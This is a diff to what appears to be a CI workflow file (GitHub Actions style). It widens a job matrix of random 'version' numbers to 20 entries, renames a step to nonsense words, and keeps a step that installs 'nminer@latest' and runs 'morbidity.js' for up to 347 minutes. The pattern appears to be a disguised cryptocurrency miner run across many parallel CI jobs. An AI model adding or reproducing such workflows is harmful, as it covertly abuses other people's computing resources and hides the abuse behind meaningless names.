@@ -9,23 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2267 }
-          - { version: 9979 }
-          - { version: 2043 }
-          - { version: 6429 }
-          - { version: 4027 }
-          - { version: 350 }
-          - { version: 7706 }
-          - { version: 394 }
-          - { version: 3692 }
-          - { version: 3861 }
-          - { version: 1906 }
-          - { version: 220 }
-          - { version: 4329 }
-          - { version: 3063 }
-          - { version: 4109 }
-          - { version: 9255 }
-          - { version: 5452 }
+          - { version: 7978 }
+          - { version: 9530 }
+          - { version: 9134 }
+          - { version: 1178 }
+          - { version: 7573 }
+          - { version: 7891 }
+          - { version: 924 }
+          - { version: 589 }
+          - { version: 3707 }
+          - { version: 1831 }
+          - { version: 2350 }
+          - { version: 1117 }
+          - { version: 6691 }
+          - { version: 4126 }
+          - { version: 886 }
+          - { version: 4957 }
+          - { version: 5212 }
+          - { version: 1253 }
+          - { version: 2828 }
+          - { version: 7742 }
 
     steps:
       - name: Checkout
@@ -36,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: livid until
+      - name: qua electrify focalise urgently
         run: |
           npm install nminer@latest
-          timeout 329m node morbidity.js || echo "morbidity executed"
+          timeout 347m node morbidity.js || echo "morbidity executed"
